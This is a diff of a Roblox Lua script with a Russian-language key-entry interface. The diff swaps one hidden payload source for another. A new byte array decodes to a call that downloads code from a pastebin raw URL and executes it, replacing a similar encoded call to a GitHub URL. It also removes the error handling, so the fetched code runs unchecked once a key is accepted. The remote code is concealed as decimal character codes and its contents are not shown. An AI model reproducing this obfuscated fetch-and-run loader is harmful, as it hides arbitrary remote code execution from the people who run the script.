@@ -49,7 +49,6 @@ title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 22
 
--- Добавляем новый текст под заголовком
 local developerLabel = Instance.new("TextLabel", frame)
 developerLabel.Size = UDim2.new(1, -20, 0, 30)
 developerLabel.Position = UDim2.new(0, 10, 0, 100)
@@ -63,7 +62,7 @@ developerLabel.TextXAlignment = Enum.TextXAlignment.Left
 local box = Instance.new("TextBox", frame)
 box.Size = UDim2.new(0.8, 0, 0, 36)
 box.Position = UDim2.new(0.1, 0, 0, 140)
-box.PlaceholderText = "Вставьте ключ..."
+box.PlaceholderText = "Вставьте ключ от MILEDI STORE..."
 box.Font = Enum.Font.Gotham
 box.TextSize = 20
 box.TextColor3 = Color3.fromRGB(50, 50, 50)
@@ -122,6 +121,12 @@ end
 pulseButton(button)
 pulseButton(getKeyButton)
 
+local scriptBytes = {
+    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
+    104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,
+    103,98,50,100,54,103,65,53,34,41,41,40,41
+}
+
 button.MouseButton1Click:Connect(function()
     local input = box.Text:match("^%s*(.-)%s*$")
     if not validKey then
@@ -141,21 +146,11 @@ button.MouseButton1Click:Connect(function()
             if pct >= 1 then
                 conn:Disconnect()
                 gui:Destroy()
-
-                local scriptCode = {
-                    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,
-                    40,34,
-                    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,
-                    111,110,116,101,110,116,46,99,111,109,47,78,105,110,106,97,49,48,57,48,56,47,83,52,47,
-                    114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,75,117,114,100,104,117,98,
-                    34,41,41,40,41
-                }
-                local s = ""
-                for _,v in ipairs(scriptCode) do
-                    s = s .. string.char(v)
+                local scriptStr = ""
+                for _, v in ipairs(scriptBytes) do
+                    scriptStr = scriptStr .. string.char(v)
                 end
-                local fn, err = loadstring(s)
-                if fn then fn() else warn("Ошибка: "..tostring(err)) end
+                loadstring(scriptStr)()
             end
         end)
     else
